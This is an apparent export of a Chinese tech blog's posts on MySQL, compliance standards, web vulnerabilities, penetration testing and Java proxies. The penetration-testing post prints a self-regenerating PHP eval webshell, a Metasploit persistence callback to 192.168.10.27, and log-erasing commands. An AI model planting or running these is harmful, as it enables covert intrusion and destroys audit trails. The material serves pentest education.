MYSQL可以使用多个字段同时建立一个索引，叫做联合索引，在联合索引中，若果想要命中索引，需要按照建立索引时的字段顺序挨个使用，否则无法命中索引。 10、创建的索引有没有被使用到 MYSQL提供了explain命令来查看语句的执行计划，MYSQL在某个语句之前，会将该语句过一遍查询优化器，之后会拿到对语句的分析。也就是执行计划，其中包含了许多信息，可以通过其中和索引有关的信息来分析是否命中了索引，例如possible_key,key,key_len等字段，分别说明了此语句可能会使用的索引，实际使用的索引以及使用的索引长度。 11、创建了索引但是没有使用的情况 使用不等于查询 列参与了数学运算或者函数 在字符串like时左边是通配符，类似于‘%aaa’ 当mysql分析全表扫描比使用索引快的时候不使用索引 当使用联合索引，前面一个条件为范围查询，后面的即使符合最左前缀原则，也无法使用索引 事务相关1、什么是事务 事务是一系列的操作，他们要符合ACID特性，最常见的理解就是：事务中的操作要么全部成功，要么全部失败。 2、锁的类型有哪些 mysql锁分为共享锁和排他锁，也叫做读锁和写锁。 读锁是共享的，可以通过lock in share mode实现，这时候只能读不能写。 写锁是排他的，它会阻塞其他的写锁和读锁，从颗粒度来区分，可以分为表锁和行锁两种。 表锁会锁定整张表并阻塞其他用户对该表的所有读写操作，比如alter修改表结构的时候会锁表。 ·行锁又可以分为乐观锁和悲观锁，悲观锁可以通过for update实现，乐观锁则通过版本号实现。 3、事务的基本特性和隔离级别 事务基本特性ACID分别是： 原子性指的是一个事务中的操作要么全部成功，要么全部失败。 一致性指的是数据库总是从一个一致性的状态转换到另一个一致性的状态。 隔离性指的是一个事物的修改在最终提交前，对其他事务是不可见的。 持久性指的是一旦事务提交，所做的修改就会永久保存到数据库中 四种隔离级别如下： 未提交读 这就是上面所说的例外情况了，这个隔离级别下，其他事物可以看到本事务没有提交的部分修改，因此会造成脏读的问题。 这个级别的性能没有足够大的优势，但是又有很多的问题，因此很少使用。 已提交读 其他事务只能读取到本事务已经提交的部分，这个隔离级别有不可重复读的问题，在同一个事务内的两次读取，拿到的结果竟然不一样，因为另外一个事务对数据进行了修改。 可重复读 可重复读隔离级别解决了上面不可重复读的问题(看名字也知道),但是仍然有一个新问题,就是 幻读,当你读取id&gt; 10 的数据行时,对涉及到的所有行加上了读锁,此时例外一个事务新插入了一条id=11的数据,因为是新插入的,所以不会触发上面的锁的排斥,那么进行本事务进行下一次的查询时会发现有一条id=11的数据,而上次的查询操作并没有获取到,再进行插入就会有主键冲突的问题. 可串行化 这是最高的隔离级别，可以解决上面提到的所有问题，因为他强制将所有的操作串行执行，这会导致并发性能极速下降，因此也不是很常用。 InnoDB默认使用的是可重复读隔离级别. 4、怎么保证ACID A原子性由undo log日志保证，它记录了需要回滚的日志信息，事务回滚时撤销已经执行成功的sql C一致性一般由代码层面来保证 I隔离性由MVCC来保证 D持久性由内存+redo log来保证，mysql修改数据同时在内存和redo log记录这次操作，事务提交的时候通过redo log刷盘，宕机的时候可以从redo log恢复","categories":[{"name":"面试题","slug":"面试题","permalink":"http://xiaohublog.cn/categories/%E9%9D%A2%E8%AF%95%E9%A2%98/"}],"tags":[{"name":"mysql","slug":"mysql","permalink":"http://xiaohublog.cn/tags/mysql/"},{"name":"面试题","slug":"面试题","permalink":"http://xiaohublog.cn/tags/%E9%9D%A2%E8%AF%95%E9%A2%98/"}]},{"title":"等保以及ISO27001","slug":"等保以及ISO27001","date":"2021-03-22T14:10:01.000Z","updated":"2021-04-03T14:05:05.205Z","comments":true,"path":"2021/03/22/等保以及ISO27001/","link":"","permalink":"http://xiaohublog.cn/2021/03/22/%E7%AD%89%E4%BF%9D%E4%BB%A5%E5%8F%8AISO27001/","excerpt":"","text":"安全审计 主机审计 网络审计 数据库审计 运维审计 日志审计 业务审计 配置审计 IT系统审计IT审计是一个获取并评价证据的过程，主要判断信息系统能否保证资金的安全、数据的完整性，有效利用组织的资源、有效地实现组织目标的过程。 规范性检查管理领域 信息安全相关制度 人员安全管理 物理安全管理 系统建设和运维安全 信息资产管理 安全事件与应急响应 技术领域 应用安全检查 网络安全检查 服务器主机安全检查 ISO27001ISO（国际标准化组织）信息安全管理体系标准 该标准从组织环境的角度，为建立、实施、运行、保持和持续改进信息安全管理体系规定了要求。本标准还规定了为适应组织需要而定制的信息安全风险评估和处置的要求。本标准规定的要求是通用的，适用与各种类型、规模和特性的组织。 安全方针 信息安全组织 资产管理 人员安全 物理与环境安全 通信与运营管理 访问控制 系统开发与维护 信息安全事故管理 业务持续性管理 法律符合性 等保网络安全等级保护，是我国网络安全领域的基本国策和基本制度 等保一级，安全性太低，没人做；等保五级安全性太高，一般涉密，执行分保。所以在做的等保项目都是二级、三级和四级。 等保二级：县级单位，比如区县医院，学校等； 等保四级：金融、军工、电力等高安全单位； 等保三级：除去二级和四级，三级最多。 网络运营者不履行义务的，由相关主管部门责令改正，给予警告；拒不改正或者导致危险后果的，需要罚款。 等保2.0的安全通用要求分类如下： 技术要求部分：安全物理环境、安全通信网络、安全区域边界，安全计算环境； 管理要求部分：安全管理中心、安全管理制度、安全管理机构、安全管理人员、安全建设管理、安全运维管理 和等保1.0标准相比，总体变化不大，对等保2.0要求做了较大幅度的精简。 等保2.0标准不再自主定级，二级及以上系统定级必须经过专家评审和主管部门审核，才能到公安机关备案，整体定级更加严格。 等保2.0最大的变化是除了安全通用的要求外，还涉及云计算安全，移动互联安全、物联网、工控安全、大数据安全 等保五步：系统定级、备案、建设整改、等级测评、监督检查 金融行业监管要求(1)金融是现代经济的核心，金融体系是全社会货币运行及信用活动的中心，其对经济运行和发展起着至关重要的作用，具有特殊的公共性和全局性。 (2)金融业是存在诸多风险的特殊行业，关系到千家万户和国民经济的方方面面。 (3)良好的金融秩序是保证金融安全的重要前提，公平竞争是保持金融秩序和金融效率的重要条件。 SOX审计-IT审计要求上市公司对财务信息和内部控制进行严格的审计。这些审计被称为SOX审计. ITGC控制实施基础设施IT一般性控制 网络管理 服务器管理 桌面计算机管理 机房管理 备份管理","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"安全","slug":"安全","permalink":"http://xiaohublog.cn/tags/%E5%AE%89%E5%85%A8/"},{"name":"等保","slug":"等保","permalink":"http://xiaohublog.cn/tags/%E7%AD%89%E4%BF%9D/"},{"name":"ISO27001","slug":"ISO27001","permalink":"http://xiaohublog.cn/tags/ISO27001/"}]},{"title":"常见漏洞原理及防范","slug":"常见漏洞原理及防范","date":"2021-03-16T14:10:01.000Z","updated":"2021-04-03T13:58:27.646Z","comments":true,"path":"2021/03/16/常见漏洞原理及防范/","link":"","permalink":"http://xiaohublog.cn/2021/03/16/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E9%98%B2%E8%8C%83/","excerpt":"","text":"常见漏洞原理及防范十大常见漏洞1、SQL注入漏洞 SQL注入攻击（SQL Injection），简称SQL注入，被广泛用于非法获取网站的控制权，是发生在应用程序数据库层的安全漏洞。其原理是在设计程序时，忽略了对输入字符串中夹带的SQL语句指令的检查，被数据库以为是正常的SQL指令而运行，从而使数据库收到攻击，可能导致数据被窃取，更改，删除，以及进一步导致网站被嵌入恶意代码，被植入后门程序等危害。 SQL注入有很多种，按数据类型可以分为数字型、字符型和搜索型，按提交方式可以分为GET型、POST型、Cookie型和请求头注入，按执行效果可以分为报错注入、联合查询注入、盲注和堆查询注入，其中盲注又分为基于bool的盲注和基于时间的盲注。 防护方法： 最稳妥的保险方法只有使用预编译语句然后绑定变量。通过使用占位符，保持查询语句和数据相分离。查询语句结构与参数值相结合，这样就防止了查询被篡改，因为参数值与已编辑好的语句相结合，而不是SQL字符串。 当实在是有like、having、group by、order by、limited、offset等动态查询时才考虑白名单输入过滤，转义等方法。 普通用户与系统管理员的权限要有严格的区分。 密码不能明文储存，可以Hash加密（比如md5）。 2、XSS跨站脚本攻击如果web页面在动态展示数据时使用了用户输入的内容，但是未做输入过滤和输出转义，导致黑客可以通过参数传入恶意代码，当用户浏览页面时恶意代码就会执行。又分为反射型跨站脚本攻击、存储型跨站脚本攻击和DOM型跨站脚本攻击。 反射型跨站脚本攻击攻击者会通过社会工程手段，发送一个URL链接给用户打开，在用户打开页面的同时，浏览器会执行页面中嵌入的恶意脚本。 存储型跨站脚本攻击攻击者利用web应用程序提供的录入或修改数据的功能，将数据存储到服务器或用户cookie中，当其他用户流量展示该数据的页面时，浏览器会执行页面中的恶意代码，所有的浏览器都会受到攻击。 DOM跨站（DOM XSS）是一种发生在客户端DOM（Document Object Model文档对象模型）中的跨站漏洞，很大原因是因为客户端脚本处理逻辑导致的安全问题。 常用的防止XSS技术包括：（1）与SQL注入防护的建议一样，假定所有输入都是可疑的，必须对所有输入中的script、iframe等字样进行严格的检查。这里的输入不仅仅是用户可以直接交互的输入接口，也包括HTTP请求中的Cookie中的变量，HTTP请求头部中的变量等。（2）不仅要验证数据的类型，还要验证其格式、长度、范围和内容。（3）不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。（4）对输出的数据也要检查，数据库里的值有可能会在一个大网站的多处都有输出，即使在输入做了编码等操作，在各处的输出点时也要进行安全检查。（5）在发布应用程序之前测试所有已知的威胁。 3、弱口令漏洞弱口令(weak password) 没有严格和准确的定义，通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。设置密码通常遵循以下原则：（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。（2）口令长度不小于8个字符。（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail地址等等与本人有关的信息，以及字典中的单词。（6）口令不应该为用数字或符号代替某些字母的单词。（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。（8）至少90天内更换一次口令，防止未被发现的入侵者继续使用该口令。 4、HTTP报头追踪漏洞HTTP/1.1（RFC2616）规范定义了HTTP TRACE方法，主要是用于客户端通过向Web服务器提交TRACE请求来进行测试或获得诊断信息。当Web服务器启用TRACE时，提交的请求头会在服务器响应的内容（Body）中完整的返回，其中HTTP头很可能包括Session Token、Cookies或其它认证信息。攻击者可以利用此漏洞来欺骗合法用户并得到他们的私人信息。该漏洞往往与其它方式配合来进行有效攻击，由于HTTP TRACE请求可以通过客户浏览器脚本发起（如XMLHttpRequest），并可以通过DOM接口来访问，因此很容易被攻击者利用。防御HTTP报头追踪漏洞的方法通常禁用HTTP TRACE方法。 5、Struts2远程命令执行漏洞ApacheStruts是一款建立Java web应用程序的开放源代码架构。Apache Struts存在一个输入过滤错误，如果遇到转换错误可被利用注入和执行任意Java代码。网站存在远程代码执行漏洞的大部分原因是由于网站采用了Apache Struts Xwork作为网站应用框架，由于该软件存在远程代码执高危漏洞，导致网站面临安全风险。CNVD处置过诸多此类漏洞，例如：“GPS车载卫星定位系统”网站存在远程命令执行漏洞(CNVD-2012-13934)；Aspcms留言本远程代码执行漏洞（CNVD-2012-11590）等。修复此类漏洞，只需到Apache官网升级Apache Struts到最新版本：http://struts.apache.org 6、文件上传漏洞文件上传漏洞通常由于网页代码中的文件上传路径变量过滤不严造成的，如果文件上传功能实现代码没有严格限制用户上传的文件后缀以及文件类型，攻击者可通过 Web 访问的目录上传任意文件，包括网站后门文件（webshell），进而远程控制网站服务器。因此，在开发网站及应用程序过程中，需严格限制和校验上传的文件，禁止上传恶意代码的文件。同时限制相关目录的执行权限，防范webshell攻击。 7、私有IP地址泄露漏洞IP地址是网络用户的重要标示，是攻击者进行攻击前需要了解的。获取的方法较多，攻击者也会因不同的网络情况采取不同的方法，如：在局域网内使用Ping指令，Ping对方在网络中的名称而获得IP；在Internet上使用IP版的QQ直接显示。最有效的办法是截获并分析对方的网络数据包。攻击者可以找到并直接通过软件解析截获后的数据包的IP包头信息，再根据这些信息了解具体的IP。针对最有效的“数据包分析方法”而言，就可以安装能够自动去掉发送数据包包头IP信息的一些软件。不过使用这些软件有些缺点，譬如：耗费资源严重，降低计算机性能；访问一些论坛或者网站时会受影响；不适合网吧用户使用等等。现在的个人用户采用最普及隐藏IP的方法应该是使用代理，由于使用代理服务器后，“转址服务”会对发送出去的数据包有所修改，致使“数据包分析”的方法失效。一些容易泄漏用户IP的网络软件(QQ、MSN、IE等)都支持使用代理方式连接Internet，特别是QQ使用“ezProxy”等代理软件连接后，IP版的QQ都无法显示该IP地址。虽然代理可以有效地隐藏用户IP，但攻击者亦可以绕过代理，查找到对方的真实IP地址，用户在何种情况下使用何种方法隐藏IP，也要因情况而论。 8、未加密登录请求由于Web配置不安全，登陆请求把诸如用户名和密码等敏感字段未加密进行传输，攻击者可以窃听网络以劫获这些敏感信息。建议进行例如SSH等的加密后再传输。 9、敏感信息泄露漏洞SQL注入、XSS、目录遍历、弱口令等均可导致敏感信息泄露，攻击者可以通过漏洞获得敏感信息。针对不同成因，防御方式不同 10、CSRFCSRF攻击利用网站对于用户网页浏览器的信任，挟持用户当前已登陆的Web应用程序，去执行并非用户本意的操作。 防护： 1、md5对cookie加密 2、refer 3、token","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"漏洞","slug":"漏洞","permalink":"http://xiaohublog.cn/tags/%E6%BC%8F%E6%B4%9E/"},{"name":"漏洞防范","slug":"漏洞防范","permalink":"http://xiaohublog.cn/tags/%E6%BC%8F%E6%B4%9E%E9%98%B2%E8%8C%83/"}]},{"title":"渗透测试过程总结","slug":"渗透测试过程总结","date":"2021-02-26T10:10:01.000Z","updated":"2021-02-27T15:00:48.325Z","comments":true,"path":"2021/02/26/渗透测试过程总结/","link":"","permalink":"http://xiaohublog.cn/2021/02/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E8%BF%87%E7%A8%8B%E6%80%BB%E7%BB%93/","excerpt":"","text":"渗透测试的基本流程​ 渗透测试就是利用我们所掌握的渗透知识，对网站进行一步一步的渗透，发现其中存在的漏洞和隐藏的风险，然后撰写一份渗透测试报告，提供给我们的客户。客户根据我们撰写的测试报告，对网站进行漏洞修补，防止黑客的入侵。 ​ 渗透测试跟入侵有着很大差别，渗透测试是在取得用户的同意，了解用户需求之后，才能对网站进行渗透。而入侵很多都是具有破坏性的，随着现在网络安全法的不断完善，一旦入侵行为对网站造成了破坏，影响网站的正常运营，很有可能会被判为违法行为，是不可取的。 ​ 渗透测试分为白盒测试和黑盒测试 白盒测试就是在知道网站源码和其他一些信息的情况下对其进行渗透，类似于代码分析。 黑盒测试就是只告诉我们这个网站的url，其他什么信息都没有，让你去渗透，模拟黑客对网站的渗透。 这里的渗透测试流程以黑盒测试为例，在只提供网站的URL，其他什么信息都不知道的情况下，我们渗透的渗透思路应该是哪样的。 （一）明确目标 确定范围：测试的范围：比如：IP、域名、内外网、整个网站还是网站的部分模块 确定规则：能渗透到什么程度（发现漏洞还是利用漏洞）、时间限制，能否修改上传，能否提权等等 确定需求：web应用的漏洞、业务逻辑的漏洞、人员权限管理漏洞等等，根据需求和自己技术能力来确定能不能做，能做多少。 （二）信息收集​ 第一步要做的就是信息收集，正所谓知己知彼百战不殆，我们根据网站URL可以查出一系列关于该网站的信息。比如脚本语言的类型、服务器的类型、目录的结构、使用的开源软件、开放的端口、数据库类型、所有链接页面、用到的框架等等。 主动信息收集：通过直接访问、扫描网站、这种流量将流经网站 被动信息收集：利用第三方的服务对目标进行访问，比如Google搜索，shodan搜索等 （三）漏洞探测​ 当我们收集到了足够多信息之后，我们就要开始对网站进行漏洞探测了。探测网站是否存在一些常见的Web漏洞 SQL注入 XSS跨站脚本 CSRF跨站脚本 XEE漏洞 SSRF服务端请求伪造漏洞 文件包含漏洞 文件上传漏洞 文件解析漏洞 远程代码执行漏洞 CORS跨域资源共享漏洞 越权访问漏洞 目录浏览漏洞和任意文件读取/下载漏洞 struts2漏洞 JAVA反序列化漏洞 …. ​ 网站漏洞扫描工具也有很多，比如： AWVS AppScan OWASP-Zap Nessus …. （四）漏洞利用​ 当我们探测到网站存在漏洞之后，我们就要对这些漏洞进行利用。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到晚上的webshell，往往需要结合几个漏洞来拿到webshell。常用的漏洞利用工具如下： SQL注入：Sqlmap XSS跨站脚本：Beef-XSS 抓包改包：Burpsuite 文件上传漏洞：我们一般会上传一句话木马上去，然后使用菜刀等工具连接从而获得webshell。 ​ 但是，获得了webshell后，一般权限很低，所以我们需要提权，可以选择反弹一个MSF类型的shell提权：Metasploit Framework(MSF)的使用、Msfvenonm生成一个后门密码，也可以反弹一个CobaltStrike类型的shell，也可以MSF和CobaltStrike联动。 （五）内网转发​ 当我们获取到了网站的webshell之后，如果我们想获取该主机的有关信息，我们可以将该主机的webshell换成MSF的shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个MSF类型的shell了。 ​ 如果我们还想进一步探测内网主机的信息的话，我们就需要进行内网转发了。我们是不能直接和内网主机通信的，所以我们就需要借助获取到的webshell网站的服务器和内网主机进行通信。 （六）权限维持​ 在拿到目标主机的权限后，很有可能当时我们并不能获取到想要的东西，需要进行长期的潜伏，特别是在内网渗透中，需要进行长期的信息收集。这时，权限维持就很重要了。我们需要维持住获得的现有权限。 （1）web后门 隐藏后门文件(将文件设置为隐藏) 不死马，该脚本每5秒向服务器创建test.php，并写入一句话免杀木马。结合attrib命令隐藏文件更好地建立后门。 1234567891011&lt;?php set_time_limit(0);//程序执行时间 ignore_user_abort(1);//关掉终端后脚本仍然运行 unlink(__FILE__);//文件完整名 while(1)&#123; file_put_contents(&#x27;test.php&#x27;,&#x27;&lt;?php $a=array($_REQUEST[&quot;x&quot;]=&gt;&quot;3&quot;); $b=array_keys($a)[0]; eval($b);?&gt;&#x27;); sleep(5); &#125;?&gt; 404页面隐藏后门，或者在其他自带文件中插入后门代码 （2）Windows系统 建立隐藏用户，在用户名后加 $ 在开机启动目录下放置木马文件，只要目标机器重启，将回连我们的远控 MSF里的 persistence 模块，执行命令可以使目标机器每隔一定时间自动回连远控。但是容易被发现 12345# 反弹时间间隔是5s 会自动连接192.168.27的4444端口，缺点是容易被杀毒软件查杀run persistence -X -i 5 -p 8888 -r 192.168.10.27 # 然后它就在目标机新建了这个文件：C:\\Windows\\TEMP\\CJzhFlNOWa.vbs ，并把该服务加入了注册表中，只要开机就会启动 在域环境下，想办法获得 krbtgt 用户的哈希，该用户的哈希可以进行票据传递攻击。而且一般该用户的密码不经常改变。 shift后门 远程桌面会话劫持 （3）Linux系统 SSH后门 crontab定时任务 SSH公钥 创建SUID=0的用户 (七) 痕迹清除Windows系统 如果是windows系统，可用MSF中的 clearev 命令清除痕迹 如果3389远程登录过，需要清除mstsc痕迹 执行命令清除日志： 1del %WINDR%\\* .log /a/s/q/f 如果是web应用，找到web日志文件，删除 Linux系统 如果是Linux系统，在获取权限后，执行以下命令，不会记录输入过的命令 1export HISTFILE=/dev/null export HISTSIZE=0 删除 /var/log 目录下的日志文件 如果是web应用，找到web日志文件，删除 (八) 撰写渗透测试报告​ 在完成了渗透测试之后，我们就需要对这次渗透测试撰写渗透测试报告了。明确的写出哪里存在漏洞，以及漏洞修补的方法。以便于网站管理员根据我们的渗透测试报告修补这些漏洞和风险，防止被黑客攻击。","categories":[{"name":"网络安全","slug":"网络安全","permalink":"http://xiaohublog.cn/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"http://xiaohublog.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"},{"name":"总结","slug":"总结","permalink":"http://xiaohublog.cn/tags/%E6%80%BB%E7%BB%93/"}]},{"title":"浅谈Lambda表达式","slug":"lambda","date":"2021-02-12T07:21:01.000Z","updated":"2021-02-24T09:19:03.428Z","comments":true,"path":"2021/02/12/lambda/","link":"","permalink":"http://xiaohublog.cn/2021/02/12/lambda/","excerpt":"","text":"lambda表达式首先需要理解Functional Interface（函数式接口），就是只包含一个方法的接口 比如Runnable接口的定义 123public interface Runnable &#123; public abstract void run();&#125; 对于函数式接口，我们可以使用lambda表达式来创建该接口的对象。 为什么要使用lambda表达式？ 避免内部类定义过多 可以让你的代码看起来很简洁 去掉了一堆没有意义的代码 lambda推导过程 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.ping.base.Demo01;//推导lambda表达式public class TestLambda &#123; //静态内部类 static class Like2 implements Ilike &#123; @Override public void lambda() &#123; System.out.println(&quot;I like lambda2&quot;); &#125; &#125; public static void main(String[] args) &#123; //实现类的实例化 Ilike like = new Like(); like.lambda(); //静态类的实例化 like = new Like2(); like.lambda(); //局部内部类的实现 class Like3 implements Ilike &#123; @Override public void lambda() &#123; System.out.println(&quot;I like lambda3&quot;); &#125; &#125; like = new Like3(); like.lambda(); //匿名内部类 like = new Ilike() &#123; @Override public void lambda() &#123; System.out.println(&quot;I like lambda4&quot;); &#125; &#125;; like.lambda(); //调用lambda表达式进行简化 like = () -&gt; &#123; System.out.println(&quot;I like lambda5&quot;); &#125;; like.lambda(); &#125;&#125;//定义接口interface Ilike &#123; public void lambda();&#125;//实现类class Like implements Ilike &#123; @Override public void lambda() &#123; System.out.println(&quot;I like lambda1&quot;); &#125;&#125; lambda简化 123456789101112131415161718192021package com.ping.base.Demo01;public class TestLambda2 &#123; public static void main(String[] args) &#123; Ilove love = null; //lambda表达式 love = (int a) -&gt; &#123; System.out.println(&quot;I love you--&gt;&quot; + a); &#125;; love.lambda(10); //lambda简化 love = a -&gt; System.out.println(&quot;I love you--&gt;&quot; + a); love.lambda(500); &#125;&#125;interface Ilove&#123; void lambda(int a);&#125; 简化需要注意： lambda表达式只能有一行代码的情况下才能省略大括号 多个参数也可以去掉参数类型，但是要一起去掉","categories":[{"name":"java","slug":"java","permalink":"http://xiaohublog.cn/categories/java/"}],"tags":[{"name":"lambda","slug":"lambda","permalink":"http://xiaohublog.cn/tags/lambda/"}]},{"title":"JAVA代理方式","slug":"静态代理","date":"2021-02-10T09:30:01.000Z","updated":"2021-02-24T09:20:25.474Z","comments":true,"path":"2021/02/10/静态代理/","link":"","permalink":"http://xiaohublog.cn/2021/02/10/%E9%9D%99%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"Java中三种代理方式—— 静态代理与两种动态代理的实现原理和方法代理模式代理（Proxy）是一种设计模式，提供了对目标对象另外的访问方式，即通过代理对象访问目标对象，这样做的好处是：可以再目标对象实现的基础上，增加额外的功能操作，即扩展目标对象的功能。 举个例子来说明代理的作用，假设我们想邀请一位明星，那么并不是直接链接明星，而是联系明星的经纪人，来达到同样的目的，明星就是一个目标对象，他只要负责活动中的节目，而其他事情就交给他的代理人来解决，这就是代理思想早期显示中的一个例子。 静态代理静态代理在使用时，需要定义接口或者父类，被代理对象与代理对象一起实现相同的接口或者是继承相同父类。 下面使用一个案例来解释如何使用静态代理： 模拟修改个人信息的动作，定义一个修改动作的接口：IPersonDao.java，然后目标对象实现这个接口的方法PersonDao.java，此时如果使用静态代理方式，就需要在代理对象（PersonDaoProxy.java）中也实现IPersonDao.java接口，调用的时候通过调用代理对象的方法来调用目标对象。（注：代理对象与目标对象要实现相同的接口，然后通过调用相同的方法来调用目标对象的方法） 接口：IPersonDao.java 123public interface IPersonDao &#123; void update();&#125; 目标对象：PersonDao.java 12345public class PersonDao implements IPersonDao &#123; public void update() &#123; System.out.println(&quot;修改个人信息&quot;); &#125;&#125; 代理对象：PersonDaoProxy.java 123456789101112public class PersonDaoProxy implements IpersonDao &#123; private IpersonDao target; public PersonDaoProxy (IpersonDao target) &#123; this.target = target; &#125; @override public void update() &#123; System.out.println(&quot;修改个人信息前记录日志&quot;); this.target.update(); System.out.println(&quot;修改个人信息后记录日志&quot;); &#125;&#125; 主函数调用 123456public class StaticProxy &#123; public statci void main(String[] args) &#123; PersonDaoProxy personDaoProxy = new PersonDaoProxy(new PersonDao()); personDaoProxy.update(); &#125;&#125; 静态代理总结： 真实对象和代理对象都要事项同一个接口 代理对象要代理真实角色 动态代理动态代理有以下特点： 代理对象，不需要实现接口 代理对象的生成，是利用JDK的API，动态的内存中构建代理对象（需要我们指定创建代理/目标对象实现的接口的类型） 动态代理也叫做：JDK代理，接口代理 JDK中生成代理对象的API 代理类所在包：java.lang.reflect.Proxy JDK实现代理只需要使用newProxyInstance方法，但是该方法需要接收三个参数，完整的写法是： 1static Object newProxyInstance(classLoader loader,Class&lt;?&gt;[] interfaces,InvocationHandler h) 接口类IPersonDao.java以及接口实现类，目标对象PersonDao是一样的，没有做修改，在这个基础上，增加一个代理工厂类（ProxyFactory.java），将代理类写在这个地方，然后在测试类（需要使用到代理的代码）中先建立目标对象和代理对象的联系，然后使用代理对象的中同名方法。 InvocationHandler实现类：PersonInvocation.java 123456789101112131415public class PersonInvocation implements InvocationHandler &#123; Object target; public PersonInvocation(Object target) &#123; super(); this.target = target; &#125; @Override public Object invoke(Object proxy, Method method, Object[] arg2) throws Throwable &#123; // TODO Auto-generated method stub System.out.println(&quot;修改个人信息前记录日志&quot;); method.invoke(target); System.out.println(&quot;修改个人信息后记录日志&quot;); return null; &#125;&#125; ​ 代理类：PersonProxy.java 123456789101112public class PersonProxy &#123; private Object target; private InvocationHandler ph; public PersonProxy(Object target, InvocationHandler ph)&#123; this.target = target; this.ph = ph; &#125; public Object getPersonProxy() &#123; Object p = Proxy.newProxyInstance(target.getclass().getClassLoader(),target.getClass().getInterfaces(),ph); return p; &#125;&#125; 如果业务不复杂也可以将InvocationHandler的实现类写入Proxy类中； 12345678910111213141516171819202122public class PersonProxy &#123; private Object target; private InvocationHandler ph; public PersonProxy(Object target,InvocationHandler ph) &#123; this.target = target; this.ph = ph; &#125; public Object getPersonProxy() &#123; Object p = Proxy.newProxyInstance(target.getClass().getClassLoader(),target.getClass().getInterfacesnew InvocationHandler() &#123; @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable &#123; System.out.println(&quot;开始事务2&quot;); //执行目标对象方法 Object returnValue = method.invoke(target, args); System.out.println(&quot;提交事务2&quot;); return returnValue; &#125; &#125;); return p; &#125;&#125; 测试类：APP.java 1234567891011121314151617181920/** * 测试类 */public class App &#123; public static void main(String[] args) &#123; // 目标对象 IUserDao target = new UserDao(); // 【原始的类型 class cn.itcast.b_dynamic.UserDao】 System.out.println(target.getClass()); // 给目标对象，创建代理对象 IUserDao proxy = (IUserDao) new ProxyFactory(target).getProxyInstance(); // class $Proxy0 内存中动态生成的代理对象 System.out.println(proxy.getClass()); // 执行方法 【代理对象】 proxy.save(); &#125;&#125; 总结: 代理对象不需要实现接口,但是目标对象一定要实现接口,否则不能用动态代理 Cglib代理上面的静态代理和动态代理模式都是要求目标对象是实现一个接口的目标对象,但是有时候目标对象只是一个单独的对象,并没有实现任何的接口,这个时候就可以使用以目标对象子类的方式类实现代理,这种方法就叫做:Cglib代理 Cglib代理,也叫作子类代理,它是在内存中构建一个子类对象从而实现对目标对象功能的扩展. JDK的动态代理有一个限制,就是使用动态代理的对象必须实现一个或多个接口,如果想代理没有实现接口的类,就可以使用Cglib实现. Cglib是一个强大的高性能的代码生成包,它可以在运行期扩展java类与实现java接口.它广泛的被许多AOP的框架使用,例如Spring AOP和synaop,为他们提供方法的interception(拦截) Cglib包的底层是通过使用一个小而块的字节码处理框架ASM来转换字节码并生成新的类.不鼓励直接使用ASM,因为它要求你必须对JVM内部结构包括class文件的格式和指令集都很熟悉. Cglib子类代理实现方法: 1.需要引入cglib的jar文件,但是Spring的核心包中已经包括了Cglib功能,所以直接在Mava中添加pring-core.jar即可.如果非maven工程需要引入cglib.jar 和asm.jar; 2.引入功能包后,就可以在内存中动态构建子类3.代理的类不能为final,否则报错4.目标对象的方法如果为final/static,那么就不会被拦截,即不会执行目标对象额外的业务方法. 代码实例： 目标对象类：PersonDao.java 1234567public class PersonDao &#123; public void update() &#123; // TODO Auto-generated method stub System.out.println(&quot;修改个人信息&quot;); &#125;&#125; Cglib代理工厂:ProxyFactory.java 12345678910111213141516171819202122232425262728public class ProxyFactory implements MethodInterceptor&#123; private Object target; public ProxyFactory(Object target)&#123; this.target = target; &#125; //给目标对象创建一个代理对象 public Object getProxyInstance()&#123; //工具类 Enhancer en = new Enhancer(); //设置父类 en.setSuperclass(target.getClass()); //设置回调函数 en.setCallback(this); //创建子类代理对象 return en.create(); &#125; @Override public Object intercept(Object obj, Method method, Object[] arg2,MethodProxy proxy) throws Throwable &#123; // TODO Auto-generated method stub System.out.println(&quot;开始事务...&quot;); Object returnValue = method.invoke(target, arg2); System.out.println(&quot;提交事务...&quot;); return returnValue; &#125; &#125; 测试类： 1234567891011public class App &#123; public static void main(String[] args)&#123; PersonDao target = new PersonDao(); ProxyFactory proxy = new ProxyFactory(target); PersonDao personPproxy = (PersonDao)proxy.getProxyInstance(); //PersonDao personPproxy = (PersonDao)new ProxyFactory(target).getProxyInstance(); personPproxy.update(); &#125; &#125; 